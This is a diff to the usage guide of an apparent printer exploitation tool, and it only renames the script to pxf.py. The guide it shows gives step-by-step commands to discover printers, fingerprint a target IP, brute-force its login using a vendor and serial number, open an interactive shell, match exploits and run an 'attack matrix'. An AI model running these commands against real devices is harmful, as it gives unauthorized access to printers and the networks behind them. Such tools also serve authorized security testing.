@@ -19,7 +19,7 @@ pip install -r requirements.txt
 ## Step 2 — Find a printer
 
 ```bash
-python printerxpl-forge.py --discover-local
+python pxf.py --discover-local
 ```
 
 Output:
@@ -33,7 +33,7 @@ Output:
 ## Step 3 — Fingerprint the target
 
 ```bash
-python printerxpl-forge.py 192.168.0.152 --scan --no-nvd
+python pxf.py 192.168.0.152 --scan --no-nvd
 ```
 
 Output (key fields):
@@ -51,7 +51,7 @@ Output (key fields):
 ## Step 4 — Brute-force login
 
 ```bash
-python printerxpl-forge.py 192.168.0.152 --bruteforce \
+python pxf.py 192.168.0.152 --bruteforce \
   --bf-vendor epson --bf-serial XAABT77481 --bf-no-variations
 ```
 
@@ -65,7 +65,7 @@ Output:
 ## Step 5 — Open interactive shell
 
 ```bash
-python printerxpl-forge.py 192.168.0.152 auto
+python pxf.py 192.168.0.152 auto
 ```
 
 ```
@@ -87,20 +87,20 @@ webServer/
 
 ```bash
 # Guided menu (no arguments)
-python printerxpl-forge.py
+python pxf.py
 
 # Full scan + exploit matching
-python printerxpl-forge.py 192.168.1.100 --scan --xpl
+python pxf.py 192.168.1.100 --scan --xpl
 
 # Full attack campaign (dry-run)
-python printerxpl-forge.py 192.168.1.100 --attack-matrix
+python pxf.py 192.168.1.100 --attack-matrix
 
 # Send a print job
-python printerxpl-forge.py 192.168.1.100 --send-job document.txt
+python pxf.py 192.168.1.100 --send-job document.txt
 
 # List all exploit modules
-python printerxpl-forge.py --xpl-list
+python pxf.py --xpl-list
 
 # Check API key status
-python printerxpl-forge.py --check-config
+python pxf.py --check-config
 ```
